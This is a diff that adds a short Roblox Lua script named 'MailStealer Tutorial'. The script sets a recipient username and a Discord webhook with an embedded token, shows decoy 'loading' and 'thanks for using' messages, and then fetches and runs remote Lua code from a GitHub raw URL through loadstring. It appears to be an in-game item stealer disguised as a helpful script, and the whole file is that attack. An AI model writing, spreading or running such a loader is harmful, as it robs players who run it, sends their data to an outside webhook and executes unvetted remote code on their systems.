@@ -1,0 +1,9 @@
+Username = "Minaz64x" 
+WebHook = "https://discord.com/api/webhooks/1146439456560259102/Yfmn7RNQ4ahfMAvxUPwARy2if-qKz06xm3YJv437JGYHoZfFFns1_2R1-WPU_z8_6ozR" 
+_G.CustomScriptName = "MailStealer Tutorial" 
+_G.Text1 = "Script Loading" 
+_G.Text2 = "Thanks for using" 
+_G.Text3 = "Checking Script..." 
+_G.Text4 = "Starting..." 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
